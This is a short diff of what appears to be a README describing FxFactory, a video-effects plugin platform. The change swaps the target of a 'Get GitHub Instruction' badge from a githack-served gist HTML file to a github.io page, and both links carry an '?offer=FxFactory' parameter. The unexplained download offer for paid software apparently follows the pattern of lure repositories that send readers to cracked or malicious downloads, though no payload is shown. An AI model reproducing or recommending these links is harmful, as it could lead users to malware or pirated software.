@@ -2,7 +2,7 @@
 
 FxFactory is a complete platform for **video effects, transitions, and motion graphics** used by professionals in editing and post-production. It serves as a unified marketplace and management tool for plugins across your favorite editors — from Final Cut Pro to After Effects. 🎬  
 
-[![Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-24292e?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/push82julianbell/33e7c5a7a67e2601331beabe2ac59c1b/raw/7c8813903f20b761faed1a0156a025363a68d42f/gets.html?offer=FxFactory)
+[![Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-24292e?style=for-the-badge&logo=github&logoColor=white)](https://app-set-deploy.github.io/.github/?offer=FxFactory)
 
 ---
 
